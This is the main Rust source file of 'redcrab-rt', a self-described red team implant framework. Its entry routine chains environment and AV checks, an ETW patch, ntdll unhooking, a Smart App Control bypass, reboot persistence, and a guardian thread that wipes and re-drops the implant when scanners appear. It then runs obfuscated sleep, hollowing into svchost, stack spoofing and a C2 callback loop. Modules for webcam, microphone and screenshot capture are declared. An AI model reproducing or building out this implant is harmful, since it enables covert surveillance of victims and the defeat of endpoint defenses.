//! redcrab-rt — red team implant framework
//! Build: python builder.py

#![no_main]
#![allow(unused_imports, dead_code)]

mod defs;
mod utils;
mod hashes;
mod syscall;
mod indirect_syscall;
mod ssn_audit;
mod loader;
mod stomp;
mod spoof;
mod sleep;
mod etw_patch;
mod unhook;
mod sac_bypass;
mod ppldump;
mod pe_obfuscate;
mod threadless_inject;
mod screenshot;
mod webcam;
mod mic;
mod filetransfer;
mod selfdestruct;
mod antidetect;
mod guardian;
mod watchdog;
mod resurrect;
mod persist;
mod hollow;
mod post_shutdown;
mod c2;

use defs::*;

const PAYLOAD: &[u8] = &[0x90];

// Patched by builder.py at pack time
const SLEEP_KEY: [u8; 16] = [
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
];

#[no_mangle]
pub extern "system" fn WinMainCRTStartup() {
    unsafe { run() };
}

unsafe fn run() {
    // ── Phase 0: resolve all NT function pointers up-front ────────────────
    // Everything below uses these — no IAT entries, no Win32 imports.
    let fn_ntqsi    = indirect_syscall::resolve_ntqsi();
    let fn_sleep_ms = indirect_syscall::resolve_sleep();
    let fn_tick     = indirect_syscall::resolve_tick();

    // ── Phase 1: SSN audit — verify HalosGate resolved correctly ──────────
    // Runs before anything else so a bad SSN resolution aborts clean rather
    // than issuing wrong syscalls that trip behavioral detections.
    ssn_audit::verify_critical_ssns();

    // ── Phase 2: Environment gate — sandbox / debugger / AV fingerprint ───
    antidetect::check_environment();

    // ── Phase 3: Hard-catch VEH installed immediately after env check ──────
    // Any EDR-induced access violation or guard-page probe on our image
    // fires full_destruct() before the process tears down.
    let fn_add_veh = indirect_syscall::resolve_add_veh();
    guardian::install_veh(fn_add_veh, selfdestruct::full_destruct);

    // ── Phase 4: Register Ctrl/signal handler (soft Defender kill-signal) ──
    selfdestruct::register_ctrl_handler();

    // ── Phase 5: Instrument bypass layer ──────────────────────────────────
    sac_bypass::bypass_sac();
    unhook::unhook_ntdll();
    etw_patch::apply_all_blinds();

    // ── Phase 6: Persistence — survives reboot before payload runs ─────────
    let own_path = own_path_via_peb();
    persist::install(&own_path);

    // ── Phase 7: Guardian thread ───────────────────────────────────────────
    // Polls every 2.5 s for AV scanner processes via NtQuerySystemInformation.
    // On detection: wipe disk → wait for scanner exit → re-drop → re-persist.
    // After 3 catches in 60 s: escalate to fileless hollow-only mode and
    // switch persistence to WNF channel (post_shutdown).
    guardian::start_thread(
        fn_ntqsi,
        fn_sleep_ms,
        fn_tick,
        selfdestruct::wipe_self,
        persist::purge_all,
        resurrect::drop_from_ads,
        persist::install_all,
        || {
            // Fileless escalation callback: hollow into svchost + WNF channel
            let mut buf = PAYLOAD.to_vec();
            pe_obfuscate::xor_payload_inplace(&mut buf, &SLEEP_KEY);
            pe_obfuscate::xor_payload_inplace(&mut buf, &SLEEP_KEY);
            let ok = hollow::hollow_into_svchost(&buf);
            if ok {
                post_shutdown::install_wnf_channel(&own_path);
            }
            ok
        },
    );

    // ── Phase 8: Sleep obfuscation — encrypt image in memory while sleeping ─
    // Foliage APC chain: NtCreateTimer2 + NtSetTimer2 + NtQueueApcThread
    // schedules VirtualProtect → XOR-encrypt → signal → XOR-decrypt → restore.
    sleep::obfuscated_sleep(500, &SLEEP_KEY);

    // ── Phase 9: Hollow into svchost (initial run — before any scan event) ─
    let mut payload_buf = PAYLOAD.to_vec();
    pe_obfuscate::xor_payload_inplace(&mut payload_buf, &SLEEP_KEY);
    pe_obfuscate::xor_payload_inplace(&mut payload_buf, &SLEEP_KEY);
    hollow::hollow_into_svchost(&payload_buf);

    // ── Phase 10: Post-injection concealment in current process ────────────
    stomp::stomp(0 as _, 0 as _, payload_buf.len());
    spoof::spoof_stack();
    pe_obfuscate::secure_zero(&mut payload_buf);

    // ── Phase 11: C2 callback loop ─────────────────────────────────────────
    c2::callback_and_loop();

    // ── Phase 12: Clean operator exit ─────────────────────────────────────
    persist::uninstall();
    selfdestruct::destruct();
}

// ── own_path_via_peb ───────────────────────────────────────────────────────
// Retrieves the full path of the current executable by reading
// PEB.ProcessParameters.ImagePathName — a UNICODE_STRING sitting in the
// process's own address space. Zero Win32 API calls, zero IAT entries.
//
// PEB offset map (x64):
//   PEB                 → gs:[0x60]
//   PEB.ProcessParameters → *PEB + 0x20  (RTL_USER_PROCESS_PARAMETERS*)
//   RTL_UPP.ImagePathName → *RTL_UPP + 0x60  (UNICODE_STRING)
//   UNICODE_STRING.Length → +0x00 (u16, byte count)
//   UNICODE_STRING.Buffer → +0x08 (*const u16)
unsafe fn own_path_via_peb() -> String {
    let peb: *const u8;
    core::arch::asm!(
        "mov {p}, gs:[0x60]",
        p = out(reg) peb,
    );
    // PEB.ProcessParameters pointer is at offset 0x20
    let proc_params = *(peb.add(0x20) as *const *const u8);
    // ImagePathName UNICODE_STRING is at offset 0x60 inside RTL_USER_PROCESS_PARAMETERS
    let img_len  = *(proc_params.add(0x60) as *const u16) as usize; // byte count
    let img_buf  = *(proc_params.add(0x68) as *const *const u16);    // pointer to wchar buffer
    let char_cnt = img_len / 2;
    let wide = core::slice::from_raw_parts(img_buf, char_cnt);
    String::from_utf16_lossy(wide)
}
